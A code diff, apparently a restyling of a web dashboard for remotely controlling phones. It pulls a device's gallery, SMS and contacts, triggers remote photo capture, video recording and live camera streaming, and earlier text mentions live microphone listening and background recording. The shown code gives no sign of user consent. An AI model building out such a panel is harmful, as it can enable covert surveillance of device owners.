@@ -129,6 +129,35 @@ export default function Home() {
     const [isDeleting, setIsDeleting] = useState(false);
     const [isScrolled, setIsScrolled] = useState(false);
 
+    const handleDeleteDevice = async (deviceId: string) => {
+        if (!session?.user?.uuid) return;
+        if (!confirm('Are you sure you want to delete this device? This cannot be undone.')) return;
+        
+        try {
+            const res = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/api/devices/delete', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ uuid: session.user.uuid, deviceId })
+            });
+            const data = await res.json();
+            if (data.success) {
+                setDevices(prev => prev.filter(d => d.deviceId !== deviceId));
+                if (selectedDeviceId === deviceId) {
+                    setSelectedDeviceId(null);
+                }
+            } else {
+                alert(data.error || 'Failed to delete device');
+            }
+        } catch (error) {
+            console.error('Failed to delete device', error);
+            alert('Failed to delete device');
+        }
+    };
+
+    const handleSignOut = async () => {
+        signOut();
+    };
+
     useEffect(() => {
         const handleScroll = () => {
             setIsScrolled(window.scrollY > 20);
@@ -1383,22 +1412,27 @@ END:VCARD`;
         switch (selectedTool) {
             case 'gallery':
                 return (
-                    <div className="space-y-6">
-                        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
-                            <div>
-                                <h2 className="text-2xl font-bold tracking-tight">Gallery Sync</h2>
-                                <p className="text-sm text-white/40">Browse and manage media files remotely.</p>
+                    <div className="space-y-6 h-full flex flex-col animate-in fade-in zoom-in-95 duration-300">
+                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4 bg-white/5 p-6 rounded-3xl border border-white/10 shadow-neo-xl">
+                            <div className="flex items-center gap-4">
+                                <div className="w-14 h-14 rounded-2xl bg-emerald-500/10 flex items-center justify-center border border-emerald-500/20 shadow-[0_0_20px_rgba(16,185,129,0.15)]">
+                                    <ImageIcon size={28} className="text-emerald-400" />
+                                </div>
+                                <div>
+                                    <h2 className="text-2xl font-bold tracking-tight">Gallery Sync</h2>
+                                    <p className="text-sm text-white/40">Browse and manage device media</p>
+                                </div>
                             </div>
-                            <div className="flex flex-wrap items-center gap-2">
-                                <button onClick={fetchFolders} disabled={!selectedDeviceId} className="btn-secondary">
+                            <div className="flex flex-wrap items-center gap-3">
+                                <button onClick={fetchFolders} disabled={!selectedDeviceId} className="btn-primary py-2 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white shadow-[0_0_15px_rgba(16,185,129,0.3)]">
                                     <RefreshCw size={16} /> Refresh
                                 </button>
                                 {isSelectionMode && (
                                     <>
-                                        <button onClick={downloadSelected} disabled={isDownloading} className="btn-primary">
+                                        <button onClick={downloadSelected} disabled={isDownloading} className="btn-secondary py-2 px-4 rounded-xl">
                                             <Download size={16} /> {isDownloading ? 'Downloading...' : 'Download'}
                                         </button>
-                                        <button onClick={deleteSelected} disabled={isDeleting} className="btn-secondary text-red-400 hover:text-red-300 border-red-400/20 hover:bg-red-400/10">
+                                        <button onClick={deleteSelected} disabled={isDeleting} className="btn-secondary py-2 px-4 rounded-xl text-red-400 border-red-400/20 hover:bg-red-400/10 hover:border-red-400/50">
                                             <Trash2 size={16} /> {isDeleting ? 'Deleting...' : 'Delete'}
                                         </button>
                                     </>
@@ -1407,21 +1441,21 @@ END:VCARD`;
                         </div>
 
                         {!selectedFolder && folders.length > 0 && (
-                            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+                            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
                                 {folders.map((folder: any, i: number) => (
                                     <motion.button 
                                         key={i}
                                         whileHover={{ scale: 1.02 }}
                                         whileTap={{ scale: 0.98 }}
                                         onClick={() => handleFolderClick(folder)}
-                                        className="p-5 rounded-2xl bezel bezel-inner flex flex-col gap-4 text-left transition-colors hover:border-emerald-500/50 group"
+                                        className="p-6 rounded-3xl bg-white/5 border border-white/10 flex flex-col gap-4 text-left transition-all hover:border-emerald-500/50 hover:bg-white/10 hover:shadow-neo-lg group"
                                     >
-                                        <div className="w-12 h-12 rounded-xl bg-emerald-500/10 flex items-center justify-center group-hover:bg-emerald-500/20 transition-colors">
-                                            <ImageIcon size={24} className="text-emerald-400" />
+                                        <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-emerald-500/20 to-emerald-900/40 flex items-center justify-center border border-emerald-500/20 shadow-inner group-hover:scale-110 transition-transform">
+                                            <Folder className="text-emerald-400 w-7 h-7" />
                                         </div>
                                         <div>
-                                            <h3 className="font-semibold truncate text-white">{folder.name}</h3>
-                                            <p className="text-xs text-white/40 mt-1 font-data">{folder.count || 0} items</p>
+                                            <h3 className="font-bold truncate text-white/90 text-lg">{folder.name}</h3>
+                                            <p className="text-xs text-emerald-400/70 mt-1 font-data uppercase tracking-widest">{folder.count || 0} items</p>
                                         </div>
                                     </motion.button>
                                 ))}
@@ -1429,127 +1463,130 @@ END:VCARD`;
                         )}
 
                         {selectedFolder && (
-                            <div className="p-6 rounded-2xl bezel bezel-inner mb-6 relative overflow-hidden">
+                            <div className="p-6 md:p-8 rounded-[2rem] bg-black/40 border border-white/5 mb-6 relative overflow-hidden shadow-inner">
                                 <div className="absolute top-0 right-0 w-64 h-64 bg-emerald-500/10 blur-[80px] pointer-events-none rounded-full" />
-                                <div className="relative z-10 flex flex-col md:flex-row items-start md:items-center justify-between mb-6 gap-4">
-                                    <div className="flex items-center gap-3">
-                                        <button onClick={() => setSelectedFolder(null)} className="p-2 rounded-lg bg-white/5 hover:bg-white/10 transition-colors">
-                                            <ChevronDown size={20} className="rotate-90" />
+                                <div className="relative z-10 flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-4">
+                                    <div className="flex items-center gap-4">
+                                        <button onClick={() => setSelectedFolder(null)} className="w-12 h-12 flex items-center justify-center rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 transition-colors">
+                                            <ChevronDown size={24} className="rotate-90 text-white/60" />
                                         </button>
-                                        <h3 className="text-xl font-bold tracking-tight">{selectedFolder.name}</h3>
+                                        <div>
+                                            <h3 className="text-2xl font-bold tracking-tight text-white">{selectedFolder.name}</h3>
+                                            <p className="text-xs text-emerald-400 font-data uppercase tracking-widest mt-1">{selectedFolder.count} items available</p>
+                                        </div>
                                     </div>
                                     {syncMediaType && (
-                                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-wrap gap-2 w-full md:w-auto">
-                                            <button onClick={() => triggerUpload(5)} className="btn-secondary text-xs py-1.5 px-3">Sync 5</button>
-                                            <button onClick={() => triggerUpload(20)} className="btn-secondary text-xs py-1.5 px-3">Sync 20</button>
-                                            <button onClick={() => triggerUpload(50)} className="btn-secondary text-xs py-1.5 px-3">Sync 50</button>
+                                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-wrap gap-2 w-full md:w-auto bg-white/5 p-1.5 rounded-2xl border border-white/10">
+                                            <button onClick={() => triggerUpload(5)} className="btn-secondary text-xs py-2 px-4 rounded-xl border-none hover:bg-white/10">Sync 5</button>
+                                            <button onClick={() => triggerUpload(20)} className="btn-secondary text-xs py-2 px-4 rounded-xl border-none hover:bg-white/10">Sync 20</button>
+                                            <button onClick={() => triggerUpload(50)} className="btn-secondary text-xs py-2 px-4 rounded-xl border-none hover:bg-white/10">Sync 50</button>
                                             <button onClick={() => {
                                                 setSyncOptionsFolder({ name: selectedFolder.name, count: selectedFolder.count, type: syncMediaType });
                                                 setShowSyncOptionsModal(true);
-                                            }} className="btn-primary text-xs py-1.5 px-3 ml-auto md:ml-0">Sync All</button>
+                                            }} className="btn-primary text-xs py-2 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-600 border-none shadow-[0_0_15px_rgba(16,185,129,0.3)]">Sync All</button>
                                         </motion.div>
                                     )}
                                 </div>
                                 <div className="flex items-center gap-4 relative z-10">
-                                    <button onClick={() => setSyncMediaType('image')} className={`flex-1 p-4 rounded-xl border ${syncMediaType === 'image' ? 'bg-emerald-500/10 border-emerald-500/50 text-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-white/5 border-white/10 hover:bg-white/10'} transition-all`}>
-                                        <ImageIcon size={24} className="mx-auto mb-2" />
-                                        <div className="text-center font-medium">Photos</div>
+                                    <button onClick={() => setSyncMediaType('image')} className={`flex-1 p-6 rounded-2xl border transition-all duration-300 group ${syncMediaType === 'image' ? 'bg-emerald-500/10 border-emerald-500/50 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-black/50 border-white/5 hover:border-white/10 hover:bg-white/5'}`}>
+                                        <ImageIcon size={32} className={`mx-auto mb-3 transition-colors ${syncMediaType === 'image' ? 'text-emerald-400' : 'text-white/30 group-hover:text-white/60'}`} />
+                                        <div className={`text-center font-bold tracking-wide ${syncMediaType === 'image' ? 'text-emerald-400' : 'text-white/50 group-hover:text-white/80'}`}>Photos</div>
                                     </button>
-                                    <button onClick={() => setSyncMediaType('video')} className={`flex-1 p-4 rounded-xl border ${syncMediaType === 'video' ? 'bg-emerald-500/10 border-emerald-500/50 text-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-white/5 border-white/10 hover:bg-white/10'} transition-all`}>
-                                        <Video size={24} className="mx-auto mb-2" />
-                                        <div className="text-center font-medium">Videos</div>
+                                    <button onClick={() => setSyncMediaType('video')} className={`flex-1 p-6 rounded-2xl border transition-all duration-300 group ${syncMediaType === 'video' ? 'bg-emerald-500/10 border-emerald-500/50 shadow-[0_0_20px_rgba(16,185,129,0.15)]' : 'bg-black/50 border-white/5 hover:border-white/10 hover:bg-white/5'}`}>
+                                        <Video size={32} className={`mx-auto mb-3 transition-colors ${syncMediaType === 'video' ? 'text-emerald-400' : 'text-white/30 group-hover:text-white/60'}`} />
+                                        <div className={`text-center font-bold tracking-wide ${syncMediaType === 'video' ? 'text-emerald-400' : 'text-white/50 group-hover:text-white/80'}`}>Videos</div>
                                     </button>
                                 </div>
                             </div>
                         )}
 
-                        <div className="flex flex-wrap items-center gap-2 mb-4">
+                        <div className="flex flex-wrap items-center gap-2 mb-4 px-2">
                             {(['all', 'image', 'video'] as const).map(tab => (
-                                <button key={tab} onClick={() => setActiveTab(tab)} className={`px-4 py-1.5 rounded-full text-sm font-medium transition-colors ${activeTab === tab ? 'bg-white text-black' : 'bg-white/10 text-white/60 hover:text-white'}`}>
+                                <button key={tab} onClick={() => setActiveTab(tab)} className={`px-6 py-2 rounded-xl text-sm font-bold transition-all ${activeTab === tab ? 'bg-white text-black shadow-lg' : 'bg-white/5 text-white/50 hover:bg-white/10 hover:text-white'}`}>
                                     {tab.charAt(0).toUpperCase() + tab.slice(1)}s
                                 </button>
                             ))}
-                            <button onClick={selectAll} className="ml-auto flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm bg-white/5 hover:bg-white/10 transition-colors font-medium">
-                                <CheckSquare size={16} /> Select All
+                            <button onClick={selectAll} className="ml-auto flex items-center gap-2 px-4 py-2 rounded-xl text-sm bg-white/5 border border-white/5 hover:border-white/10 hover:bg-white/10 transition-all font-bold">
+                                <CheckSquare size={16} className="text-emerald-400" /> Select All
                             </button>
                         </div>
-                        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
+                        
+                        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-4 px-2 pb-6">
                             {filteredImages.map((img: any) => (
-                                <div key={img.id} onClick={() => toggleSelection(img.id)} className={`relative aspect-square rounded-xl overflow-hidden cursor-pointer group border-2 transition-all ${selectedItems.has(img.id) ? 'border-emerald-400 scale-[0.97]' : 'border-transparent hover:border-white/20'}`}>
+                                <div key={img.id} onClick={() => toggleSelection(img.id)} className={`relative aspect-square rounded-2xl overflow-hidden cursor-pointer group transition-all duration-300 ${selectedItems.has(img.id) ? 'scale-[0.95] ring-4 ring-emerald-500 ring-offset-2 ring-offset-black' : 'hover:scale-105 hover:shadow-neo-lg'}`}>
                                     {img.resource_type === 'video' ? (
                                         <video src={img.url} className="w-full h-full object-cover" />
                                     ) : (
                                         <img src={img.url} alt="Gallery" className="w-full h-full object-cover" loading="lazy" />
                                     )}
                                     <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
-                                        <button onClick={(e) => { e.stopPropagation(); setPreviewItem(img); }} className="p-3 rounded-full bg-white/20 backdrop-blur-md hover:bg-white/30 transition-colors">
+                                        <button onClick={(e) => { e.stopPropagation(); setPreviewItem(img); }} className="w-12 h-12 flex items-center justify-center rounded-full bg-white/20 backdrop-blur-md hover:bg-white/40 transition-colors border border-white/30 shadow-lg">
                                             <Search size={20} className="text-white" />
                                         </button>
                                     </div>
                                     {selectedItems.has(img.id) && (
-                                        <div className="absolute top-2 right-2 w-6 h-6 rounded-full bg-emerald-500 shadow-lg flex items-center justify-center animate-scaleIn">
-                                            <Check size={14} className="text-black" />
+                                        <div className="absolute top-3 right-3 w-8 h-8 rounded-full bg-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.5)] flex items-center justify-center animate-scaleIn border-2 border-black">
+                                            <Check size={16} className="text-black font-bold" strokeWidth={3} />
                                         </div>
                                     )}
                                 </div>
                             ))}
                         </div>
-                        {galleryHasMore && <div ref={galleryLoaderRef} className="h-20 flex items-center justify-center"><div className="w-6 h-6 rounded-full border-2 border-emerald-500/30 border-t-emerald-500 animate-spin" /></div>}
+                        {galleryHasMore && <div ref={galleryLoaderRef} className="h-20 flex items-center justify-center"><div className="w-8 h-8 rounded-full border-4 border-emerald-500/20 border-t-emerald-500 animate-spin shadow-[0_0_15px_rgba(16,185,129,0.5)]" /></div>}
                     </div>
                 );
             case 'sms':
-            case 'contacts':
-                const isSms = selectedTool === 'sms';
-                const items = isSms ? filteredSms : filteredContacts;
-                const search = isSms ? smsSearchQuery : contactsSearchQuery;
-                const setSearch = isSms ? setSmsSearchQuery : setContactsSearchQuery;
-                const fetchFn = isSms ? fetchSms : fetchContacts;
-                const isFetching = isSms ? isFetchingSms : isFetchingContacts;
-
                 return (
-                    <div className="space-y-6 h-full flex flex-col">
-                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4">
-                            <div>
-                                <h2 className="text-2xl font-bold tracking-tight">{isSms ? 'Messages' : 'Contacts'}</h2>
-                                <p className="text-sm text-white/40">View and backup device {isSms ? 'SMS' : 'contacts'}.</p>
+                    <div className="space-y-6 h-full flex flex-col animate-in fade-in zoom-in-95 duration-300">
+                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4 bg-white/5 p-6 rounded-3xl border border-white/10 shadow-neo-xl">
+                            <div className="flex items-center gap-4">
+                                <div className="w-14 h-14 rounded-2xl bg-sky-500/10 flex items-center justify-center border border-sky-500/20 shadow-[0_0_20px_rgba(14,165,233,0.15)]">
+                                    <MessageSquare size={28} className="text-sky-400" />
+                                </div>
+                                <div>
+                                    <h2 className="text-2xl font-bold tracking-tight">Messages</h2>
+                                    <p className="text-sm text-white/40">View and backup device SMS</p>
+                                </div>
                             </div>
-                            <div className="flex items-center gap-2">
-                                <button onClick={fetchFn} disabled={!selectedDeviceId || isFetching} className="btn-primary">
-                                    <RefreshCw size={16} className={isFetching ? "animate-spin" : ""} /> Sync {isSms ? 'SMS' : 'Contacts'}
+                            <div className="flex items-center gap-3">
+                                <div className="relative">
+                                    <Search size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-white/40" />
+                                    <input 
+                                        type="text" 
+                                        placeholder="Search messages..." 
+                                        value={smsSearchQuery}
+                                        onChange={(e) => setSmsSearchQuery(e.target.value)}
+                                        className="pl-10 pr-4 py-2 bg-black/40 border border-white/10 rounded-xl text-sm focus:outline-none focus:border-sky-500/50 w-full sm:w-48 transition-all"
+                                    />
+                                </div>
+                                <button onClick={fetchSms} disabled={!selectedDeviceId || isFetchingSms} className="btn-primary py-2 px-4 rounded-xl bg-sky-500 hover:bg-sky-600 text-white shadow-[0_0_15px_rgba(14,165,233,0.3)]">
+                                    <RefreshCw size={16} className={isFetchingSms ? "animate-spin" : ""} /> Sync
                                 </button>
-                                {isSms ? (
-                                    <button onClick={downloadSmsAsCsv} className="btn-secondary"><Download size={16}/> CSV</button>
-                                ) : (
-                                    <button onClick={downloadContactsAsVcf} className="btn-secondary"><Download size={16}/> vCard</button>
-                                )}
+                                <button onClick={downloadSmsAsCsv} className="btn-secondary py-2 px-4 rounded-xl"><Download size={16}/> CSV</button>
                             </div>
                         </div>
-                        <div className="relative flex-shrink-0">
-                            <Search size={18} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-white/40" />
-                            <input 
-                                type="text" 
-                                placeholder="Search..." 
-                                value={search}
-                                onChange={(e) => setSearch(e.target.value)}
-                                className="input-field pl-11 bg-white/5 border-white/10"
-                            />
-                        </div>
-                        <div className="flex-1 overflow-y-auto bezel bezel-inner rounded-2xl p-2 scrollbar-hide">
-                            <div className="flex flex-col gap-1">
-                                {items.length === 0 ? (
-                                    <div className="py-20 flex items-center justify-center text-white/40 font-medium">No items found. Click sync to fetch.</div>
+                        
+                        <div className="flex-1 overflow-y-auto custom-scrollbar bg-black/20 rounded-3xl border border-white/5 p-4 sm:p-6">
+                            <div className="flex flex-col gap-3">
+                                {filteredSms.length === 0 ? (
+                                    <div className="py-20 flex flex-col items-center justify-center text-white/30 font-medium gap-4">
+                                        <MessageSquare size={48} strokeWidth={1} />
+                                        <p>No messages found. Click sync to fetch.</p>
+                                    </div>
                                 ) : (
-                                    items.map((item: any, i: number) => (
-                                        <div key={i} className="p-4 rounded-xl bg-transparent hover:bg-white/5 transition-colors flex gap-4 border-b border-white/5 last:border-0">
-                                            <div className={`w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 ${isSms ? 'bg-sky-500/10 text-sky-400' : 'bg-indigo-500/10 text-indigo-400'}`}>
-                                                {isSms ? <MessageSquare size={18} /> : <Users size={18} />}
-                                            </div>
-                                            <div className="flex-1 min-w-0 flex flex-col justify-center">
-                                                <div className="flex items-center justify-between mb-0.5">
-                                                    <h4 className="font-semibold truncate text-white/90 text-sm">{isSms ? item.address : item.name}</h4>
-                                                    {isSms && <span className="text-xs text-white/40 font-data flex-shrink-0 ml-2">{new Date(item.date).toLocaleDateString()}</span>}
+                                    filteredSms.map((item: any, i: number) => (
+                                        <div key={i} className="p-5 rounded-2xl bg-white/5 hover:bg-white/10 transition-colors border border-white/5 group flex flex-col sm:flex-row gap-4">
+                                            <div className="flex items-center gap-3 min-w-[200px] flex-shrink-0">
+                                                <div className="w-10 h-10 rounded-full bg-gradient-to-br from-sky-500/20 to-transparent flex items-center justify-center text-sky-400 font-bold border border-sky-500/10">
+                                                    {item.address?.charAt(0).toUpperCase() || '?'}
                                                 </div>
-                                                <p className="text-sm text-white/50 truncate">{isSms ? item.body : (item.phones?.[0]?.number || item.phones?.[0] || 'No number')}</p>
+                                                <div className="flex flex-col">
+                                                    <span className="font-bold text-white/90 text-sm tracking-wide">{item.address}</span>
+                                                    <span className="text-[10px] text-white/40 font-data uppercase tracking-wider">{new Date(item.date).toLocaleString()}</span>
+                                                </div>
+                                            </div>
+                                            <div className="flex-1 bg-black/40 p-4 rounded-2xl rounded-tl-sm border border-white/5">
+                                                <p className="text-sm text-white/80 leading-relaxed">{item.body}</p>
                                             </div>
                                         </div>
                                     ))
@@ -1558,31 +1595,111 @@ END:VCARD`;
                         </div>
                     </div>
                 );
-            case 'camera':
-            case 'audio':
-                const isCam = selectedTool === 'camera';
+            case 'contacts':
                 return (
-                    <div className="flex flex-col items-center justify-center min-h-[60vh] py-8">
-                        <div className="w-full max-w-xl bezel bezel-inner rounded-[2.5rem] p-8 sm:p-12 text-center space-y-8 relative overflow-hidden">
-                            <div className={`absolute top-[-20%] right-[-20%] w-[60%] h-[60%] blur-[100px] rounded-full pointer-events-none ${isCam ? 'bg-pink-500/20' : 'bg-amber-500/20'}`} />
-                            <div className={`w-24 h-24 mx-auto rounded-[2rem] flex items-center justify-center shadow-2xl relative z-10 ${isCam ? 'bg-pink-500/10 text-pink-400 border border-pink-500/20' : 'bg-amber-500/10 text-amber-400 border border-amber-500/20'}`}>
-                                {isCam ? <Camera size={40} /> : <Mic size={40} />}
+                    <div className="space-y-6 h-full flex flex-col animate-in fade-in zoom-in-95 duration-300">
+                        <div className="flex flex-col sm:flex-row sm:items-center justify-between flex-shrink-0 gap-4 bg-white/5 p-6 rounded-3xl border border-white/10 shadow-neo-xl">
+                            <div className="flex items-center gap-4">
+                                <div className="w-14 h-14 rounded-2xl bg-emerald-500/10 flex items-center justify-center border border-emerald-500/20 shadow-[0_0_20px_rgba(16,185,129,0.15)]">
+                                    <Users size={28} className="text-emerald-400" />
+                                </div>
+                                <div>
+                                    <h2 className="text-2xl font-bold tracking-tight">Contacts</h2>
+                                    <p className="text-sm text-white/40">View and backup device contacts</p>
+                                </div>
                             </div>
-                            <div className="relative z-10">
-                                <h2 className="text-3xl font-bold tracking-tight mb-3">Live {isCam ? 'Camera' : 'Audio'} Feed</h2>
-                                <p className="text-white/40 max-w-sm mx-auto text-sm leading-relaxed">Remotely trigger the device's {isCam ? 'camera to capture high-res photos or stream video' : 'microphone for live listening or background recording'}.</p>
+                            <div className="flex items-center gap-3">
+                                <div className="relative">
+                                    <Search size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-white/40" />
+                                    <input 
+                                        type="text" 
+                                        placeholder="Search contacts..." 
+                                        value={contactsSearchQuery}
+                                        onChange={(e) => setContactsSearchQuery(e.target.value)}
+                                        className="pl-10 pr-4 py-2 bg-black/40 border border-white/10 rounded-xl text-sm focus:outline-none focus:border-emerald-500/50 w-full sm:w-48 transition-all"
+                                    />
+                                </div>
+                                <button onClick={fetchContacts} disabled={!selectedDeviceId || isFetchingContacts} className="btn-primary py-2 px-4 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white shadow-[0_0_15px_rgba(16,185,129,0.3)]">
+                                    <RefreshCw size={16} className={isFetchingContacts ? "animate-spin" : ""} /> Sync
+                                </button>
+                                <button onClick={downloadContactsAsVcf} className="btn-secondary py-2 px-4 rounded-xl"><Download size={16}/> vCard</button>
                             </div>
-                            <div className="flex flex-wrap items-center justify-center gap-3 relative z-10">
-                                {isCam ? (
-                                    <>
-                                        <button 
-                                            onClick={() => { setIsCapturingPhoto(true); socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode }); }}
-                                            disabled={isCapturingPhoto}
-                                            className="btn-primary py-3 px-6 rounded-xl bg-white/10 hover:bg-white/20 text-white shadow-none"
-                                        >
-                                            {isCapturingPhoto ? <RefreshCw className="animate-spin" size={18}/> : <Camera size={18} />}
-                                            Capture Photo
-                                        </button>
+                        </div>
+                        
+                        <div className="flex-1 overflow-y-auto custom-scrollbar p-2">
+                            {filteredContacts.length === 0 ? (
+                                <div className="py-20 flex flex-col items-center justify-center text-white/30 font-medium gap-4">
+                                    <Users size={48} strokeWidth={1} />
+                                    <p>No contacts found. Click sync to fetch.</p>
+                                </div>
+                            ) : (
+                                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
+                                    {filteredContacts.map((item: any, i: number) => (
+                                        <div key={i} className="p-5 rounded-3xl bg-white/5 hover:bg-white/10 transition-all border border-white/5 group flex items-center gap-4 hover:shadow-neo-lg hover:-translate-y-1">
+                                            <div className="w-12 h-12 rounded-full bg-gradient-to-br from-emerald-500/20 to-emerald-900/40 flex items-center justify-center text-emerald-400 font-bold text-lg border border-emerald-500/20 shadow-inner">
+                                                {item.name?.charAt(0).toUpperCase() || '?'}
+                                            </div>
+                                            <div className="flex flex-col min-w-0">
+                                                <h4 className="font-bold truncate text-white/90">{item.name}</h4>
+                                                <p className="text-xs text-white/50 truncate font-data tracking-wide mt-0.5">{item.phones?.[0]?.number || item.phones?.[0] || 'No number'}</p>
+                                            </div>
+                                        </div>
+                                    ))}
+                                </div>
+                            )}
+                        </div>
+                    </div>
+                );
+            case 'camera':
+                return (
+                    <div className="space-y-6 animate-in fade-in zoom-in-95 duration-300">
+                        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+                            <div>
+                                <h2 className="text-2xl font-bold tracking-tight flex items-center gap-2">
+                                    <Camera className="text-cyan-400" /> Camera Control
+                                </h2>
+                                <p className="text-sm text-white/40">Remote capture, recording and live feed.</p>
+                            </div>
+                            <div className="flex items-center gap-2 bg-white/5 p-1 rounded-xl">
+                                <button onClick={() => setCameraMode('back')} className={`px-4 py-2 rounded-lg text-sm font-semibold transition-all ${cameraMode === 'back' ? 'bg-white text-black shadow-lg' : 'text-white/60 hover:text-white hover:bg-white/10'}`}>Rear</button>
+                                <button onClick={() => setCameraMode('front')} className={`px-4 py-2 rounded-lg text-sm font-semibold transition-all ${cameraMode === 'front' ? 'bg-white text-black shadow-lg' : 'text-white/60 hover:text-white hover:bg-white/10'}`}>Front</button>
+                            </div>
+                        </div>
+
+                        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                            {/* Main Stage */}
+                            <div className="lg:col-span-2 space-y-4">
+                                <div className="aspect-video bg-black rounded-3xl border border-white/10 overflow-hidden relative shadow-neo-2xl flex items-center justify-center">
+                                    {isLiveStreaming ? (
+                                        liveFrame ? (
+                                            <img src={`data:image/jpeg;base64,${liveFrame}`} className="w-full h-full object-contain" alt="Live Feed" />
+                                        ) : (
+                                            <div className="absolute inset-0 flex items-center justify-center bg-cyan-500/10 backdrop-blur-md">
+                                                <div className="flex flex-col items-center gap-4">
+                                                    <div className="w-16 h-16 rounded-full bg-cyan-500/20 flex items-center justify-center animate-pulse">
+                                                        <Video className="w-8 h-8 text-cyan-400" />
+                                                    </div>
+                                                    <span className="text-cyan-400 font-bold tracking-widest uppercase">Live Stream Active</span>
+                                                </div>
+                                            </div>
+                                        )
+                                    ) : isRecording ? (
+                                        <div className="absolute inset-0 flex items-center justify-center bg-red-500/10 backdrop-blur-md">
+                                            <div className="flex flex-col items-center gap-4">
+                                                <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center animate-pulse">
+                                                    <Square className="w-8 h-8 text-red-400" />
+                                                </div>
+                                                <span className="text-red-400 font-bold tracking-widest uppercase">Recording... {recordingProgress.current}s / {recordingProgress.total}s</span>
+                                            </div>
+                                        </div>
+                                    ) : (
+                                        <div className="text-white/20 flex flex-col items-center gap-2">
+                                            <Camera size={48} strokeWidth={1} />
+                                            <span className="text-sm font-medium">Camera Ready</span>
+                                        </div>
+                                    )}
+                                    {/* Action Bar Overlay */}
+                                    <div className="absolute bottom-6 left-1/2 -translate-x-1/2 flex items-center gap-4 p-2 bg-black/60 backdrop-blur-xl border border-white/10 rounded-full shadow-2xl">
                                         <button 
                                             onClick={() => {
                                                 if (isLiveStreaming) {
@@ -1593,10 +1710,18 @@ END:VCARD`;
                                                     setIsLiveStreaming(true);
                                                 }
                                             }}
-                                            className={`btn-primary py-3 px-6 rounded-xl ${isLiveStreaming ? 'bg-red-500 hover:bg-red-600 shadow-lg shadow-red-500/30' : 'bg-emerald-500 hover:bg-emerald-600 shadow-lg shadow-emerald-500/20'}`}
+                                            className={`w-12 h-12 rounded-full flex items-center justify-center transition-all ${isLiveStreaming ? 'bg-red-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.5)]' : 'bg-white/10 text-white hover:bg-white/20'}`}
+                                            title="Live Stream"
                                         >
-                                            {isLiveStreaming ? <Square size={18} /> : <Video size={18} />}
-                                            {isLiveStreaming ? 'Stop Stream' : 'Live Stream'}
+                                            <Video size={20} />
+                                        </button>
+                                        <button 
+                                            onClick={() => { setIsCapturingPhoto(true); socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode }); }}
+                                            disabled={isCapturingPhoto}
+                                            className={`w-16 h-16 rounded-full flex items-center justify-center border-4 transition-all ${isCapturingPhoto ? 'border-cyan-500 bg-cyan-500/20' : 'border-white/30 bg-white hover:bg-gray-200'} text-black shadow-[0_0_20px_rgba(255,255,255,0.2)]`}
+                                            title="Capture Photo"
+                                        >
+                                            {isCapturingPhoto ? <RefreshCw className="animate-spin text-cyan-400" size={24}/> : <div className="w-14 h-14 rounded-full border-2 border-black/10" />}
                                         </button>
                                         <button 
                                             onClick={() => {
@@ -1609,120 +1734,221 @@ END:VCARD`;
                                                     socket?.emit('start_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: recordingDuration });
                                                 }
                                             }}
-                                            className={`btn-primary py-3 px-6 rounded-xl ${isRecording ? 'bg-red-500 hover:bg-red-600 shadow-lg shadow-red-500/30' : 'bg-pink-500 hover:bg-pink-600 shadow-lg shadow-pink-500/20'}`}
+                                            className={`w-12 h-12 rounded-full flex items-center justify-center transition-all ${isRecording ? 'bg-red-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.5)]' : 'bg-white/10 text-white hover:bg-white/20'}`}
+                                            title="Record Video"
                                         >
-                                            {isRecording ? <Square size={18} /> : <Video size={18} />}
-                                            {isRecording ? 'Stop Recording' : 'Record Video'}
+                                            <div className={`w-4 h-4 rounded-full ${isRecording ? 'bg-white' : 'bg-red-500'}`} />
                                         </button>
-                                    </>
-                                ) : (
-                                    <>
-                                        <button 
-                                            onClick={isLiveAudio ? stopLiveAudio : startLiveAudio}
-                                            className={`btn-primary py-3 px-6 rounded-xl ${isLiveAudio ? 'bg-red-500 hover:bg-red-600 shadow-lg shadow-red-500/30' : 'bg-amber-500 hover:bg-amber-600 shadow-lg shadow-amber-500/20'}`}
-                                        >
